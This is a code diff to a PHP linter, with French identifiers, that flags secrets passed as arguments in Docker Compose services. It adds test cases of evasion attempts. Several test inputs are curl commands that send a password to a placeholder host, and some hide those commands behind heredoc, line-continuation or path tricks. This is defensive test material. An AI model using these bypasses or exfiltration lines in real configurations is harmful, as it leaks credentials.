@@ -172,7 +172,7 @@ function secretsEnArgumentNoms(array $composition): array
 
     foreach ($environnements as $environnement) {
         foreach (secretsEnArgumentCouples($environnement) as $nom => $valeur) {
-            preg_match_all('/(?<!\$)\$\{?([A-Za-z_][A-Za-z0-9_]*)/', $valeur, $trouvees);
+            preg_match_all('/\$\$?\{?([A-Za-z_][A-Za-z0-9_]*)/', $valeur, $trouvees);
 
             $interpole = array_filter($trouvees[1], static fn (string $variable): bool => preg_match($motif, $variable) === 1) !== [];
 
@@ -229,20 +229,24 @@ function secretsEnArgumentDefauts(string $texte, array $secrets, bool $interpret
         $lecteurs = SECRETS_EN_ARGUMENT_LECTEURS_SURS;
         $substitutions = [
             '__D__' => '(?:^|[;&|(\n])\s*(?:(?:env|export)\s+)?',
-            '__R__' => '"\$\$\{?[A-Za-z0-9_]+\}?"',
+            '__R__' => '"\$\$\{?[A-Z0-9_]+\}?"',
             '__C__' => "(?=(?:\\s*{$lecteurs}\\b(?>(?:(?!&&|\\$\\$\\(|\\$\\()[^|;\\n)`>])*)\\|?)+\\s*(?:\\)|\\n|\$))",
         ];
 
         // Le document intégré de Redis, et lui seul : ses références du shell
         // s'effacent, l'interpolation de Compose reste vue.
         $reste = (string) preg_replace_callback(
-            '/((?:[^;&|\n\\\\]|\\\\.)*)<<-?\s*(\w+)([^\n]*\n)(.*?)\n\s*\2\b/s',
-            static fn (array $trouve): string => preg_match('/^\s*(?:exec\s+)?(?:docker-entrypoint\.sh\s+)?redis-server(?![\w.-])/', $trouve[1]) === 1
-                && preg_match('/[|;]|&&/', $trouve[3]) === 0
-                && preg_match('/\$\$\(|`/', $trouve[4]) === 0
-                    ? $trouve[1].$trouve[3].preg_replace('/(?<!\$)\$\$(?!\$)\{?[A-Za-z_]\w*\}?/', '', $trouve[4])
-                    : $trouve[0],
+            '/((?:[^;&|\n\\\\]|\\\\.)*)<<-?\s*(\w+)([^\n]*\n)(.*?)(?:\n|(?<=\n))\s*\2\b/s',
+            static fn (array $trouve): string => preg_match('/^\s*(?:exec\s+)?(?:docker-entrypoint\.sh\s+)?redis-server(?![\w.\/-])/', $trouve[1][0]) === 1
+                && preg_match('/[|;\\\\]|&&/', $trouve[3][0]) === 0
+                && preg_match('/\$\$\(|`/', $trouve[4][0]) === 0
+                && ($trouve[0][1] === 0 || $reste[$trouve[0][1] - 1] === "\n")
+                    ? $trouve[1][0].$trouve[3][0].preg_replace('/(?<!\$)\$\$(?!\$)\{?[A-Za-z_]\w*\}?/', '', $trouve[4][0])
+                    : $trouve[0][0],
             $reste,
+            -1,
+            $compte,
+            PREG_OFFSET_CAPTURE,
         );
 
         preg_match_all(strtr('/__D__([A-Za-z_][A-Za-z0-9_]*)=\$\$\(\s*printf\s+%s\s+__R__/', $substitutions), $reste, $affectes);
@@ -268,7 +272,11 @@ function secretsEnArgumentDefauts(string $texte, array $secrets, bool $interpret
 
     $mysql = SECRETS_EN_ARGUMENT_BINAIRES_MYSQL;
     $longues = '(?:^|\s)--(?:(?:requirepass|masterauth|password|pass|auth)\b|(?:passwd|passphrase|secret|token|jeton|cle|key|api-key|mot-de-passe)(?=[=\s]|$))';
-    $courtes = '(?:^|\s)(?:-a\s|-p(?!ass(?:in|out)?\s+["\']?(?:stdin|env:|file:|fd:))\S)';
+    // `-pass stdin` n'est une exception que pour openssl : ailleurs `-pass` est
+    // `-p` suivi du mot de passe `ass`.
+    $courtes = preg_match('/\bopenssl\b/', $reste) === 1
+        ? '(?:^|\s)(?:-a\s|-p(?!ass(?:in|out)?\s+["\']?(?:stdin|env:|file:|fd:))\S)'
+        : '(?:^|\s)(?:-a\s|-p\S)';
     $openssl = '(?<![\w-])pass:|(?:^|\s)-pass(?:in|out)?\s+(?!["\']?(?:stdin|env:|file:|fd:))\S';
     // `-p <valeur>` de la famille MySQL, refusé par prudence, d'une ligne de
     // shell comme d'une liste (dont les éléments se joignent par des retours
@@ -474,6 +482,14 @@ it('refuse, sur la vraie composition, chaque cas de la campagne #2397 (trous lai
     'sed qui relit le secret par $(cat)' => [[['services.redis.command', 'printf %s "$$REDIS_PASSWORD" | sed "s/x/$$(cat)/"', true]]],
     'head qui relit le secret par $(cat)' => [[['services.redis.command', 'printf %s "$$REDIS_PASSWORD" | head -c "$$(cat)"', true]]],
     'C9 : un tube vers un fichier, puis xargs à la ligne suivante' => [[['services.redis.command', "printf %s \"\$\$REDIS_PASSWORD\" | cat > /tmp/p\nxargs curl -u < /tmp/p", true]]],
+    'un document intégré vide, suivi de vraies commandes' => [[['services.redis.command', ['sh', '-c', "redis-server --version <<FIN\nFIN\ncurl -u \"u:\$\$REDIS_PASSWORD\" http://h\nFIN"]]]],
+    'une continuation de ligne après le marqueur' => [[['services.redis.command', ['sh', '-c', "redis-server --version <<FIN \\\n; curl -u \"u:\$\$REDIS_PASSWORD\" http://h\nrequirepass x\nFIN"]]]],
+    'un redis-server entre guillemets, après un point-virgule' => [[['services.redis.command', ['sh', '-c', "logger \"x; redis-server <<FIN\nrequirepass \$\$REDIS_PASSWORD\nFIN\""]]]],
+    'un redis-server qui est un chemin' => [[['services.redis.command', ['sh', '-c', "redis-server/../../bin/sh <<FIN\ncurl -u \"u:\$\$REDIS_PASSWORD\" http://h\nFIN"]]]],
+    'un alias $${NOM} dans l’environnement' => [[['services.redis.environment', ['REDIS_PASSWORD' => 'x', 'X' => '$${REDIS_PASSWORD}']], ['services.redis.command', 'eval notifier "$$X"', true]]],
+    '-pass env: pour une autre commande qu’openssl' => [[['services.db.healthcheck.test', ['CMD-SHELL', 'mysqladmin -uroot -pass env:X ping']]]],
+    'un nom en minuscules derrière MYSQL_PWD' => [[['services.db.healthcheck.test', ['CMD-SHELL', 'MYSQL_PWD="$$db_password" mysqladmin ping']]]],
+    'un nom en minuscules devant un tube' => [[['services.redis.command', 'printf %s "$$redis_password" | cat', true]]],
     'une option --token' => [[['services.redis.command', 'notifier --token abc', true]]],
 ]);
 
@@ -849,7 +865,7 @@ FIN',
         0 => [
             0 => 'services.app.command',
             1 => 'php <<FIN
-<?php passthru(\'curl -u u:$$DB_PASSWORD http://h\');
+<?php $x = \'curl -u u:$$DB_PASSWORD http://h\';
 FIN',
         ],
     ]],
@@ -888,7 +904,7 @@ FIN',
             1 => [
                 0 => 'CMD-SHELL',
                 1 => 'python3 <<FIN
-import os; os.system(\'mysqladmin ping -uroot -p$$MYSQL_ROOT_PASSWORD\')
+x = (\'mysqladmin ping -uroot -p$$MYSQL_ROOT_PASSWORD\')
 FIN',
             ],
         ],
